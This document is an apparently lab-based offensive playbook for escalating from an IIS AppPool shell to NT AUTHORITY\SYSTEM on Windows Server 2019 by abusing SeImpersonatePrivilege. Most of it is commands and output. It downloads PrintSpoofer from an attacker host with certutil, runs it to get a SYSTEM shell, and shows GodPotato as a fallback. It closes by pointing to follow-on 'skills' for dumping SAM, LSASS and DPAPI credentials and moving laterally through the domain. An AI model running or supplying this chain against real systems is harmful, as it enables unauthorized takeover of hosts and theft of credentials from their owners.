# Windows Potato (SeImpersonate) to SYSTEM

## Scenario
IIS AppPool shell on Windows Server 2019, SeImpersonatePrivilege available.

## Step 1: Check Privileges
```cmd
C:\inetpub\wwwroot> whoami
iis apppool\defaultapppool

C:\inetpub\wwwroot> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled   <-- TARGET
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

## Step 2: Transfer PrintSpoofer
```cmd
C:\inetpub\wwwroot> certutil -urlcache -split -f http://10.10.14.5/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
****  Online  ****
  000000  ...
  00c800
CertUtil: -URLCache command completed successfully.
```

## Step 3: Execute PrintSpoofer
```cmd
C:\Windows\Temp> ps.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

Microsoft Windows [Version 10.0.17763.5820]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
WEB01

C:\Windows\system32> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet0:
   IPv4 Address. . . . . . . . . . . : 10.10.10.80
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.1
```

## Alternative: GodPotato (if PrintSpoofer fails)
```cmd
C:\Windows\Temp> GodPotato.exe -cmd "cmd /c whoami"
[*] CombaseDisableNotifications (0)
[*] Found COM server port: 7120
[+] Using CLSID: {854A20FB-2D44-457D-992F-EF13785D2B51}
[*] Triggering NTLM Authentication...
[+] Received connection from 127.0.0.1
[+] Got NTLM type 1 message
[+] Got NTLM type 3 message
[*] Calling CreateProcessAsUser...
nt authority\system
```

## Evidence
- SeImpersonatePrivilege enabled on IIS AppPool account
- PrintSpoofer64 → immediate SYSTEM shell
- GodPotato confirmed as backup (works on Server 2019)
- MITRE: T1134.001 (Token Impersonation)

## Next Steps
→ **credential_access skill**: Dump SAM/SYSTEM, LSASS, DPAPI
→ **discovery skill**: Domain enumeration as SYSTEM
→ **lateral_movement skill**: Use extracted creds for domain pivot
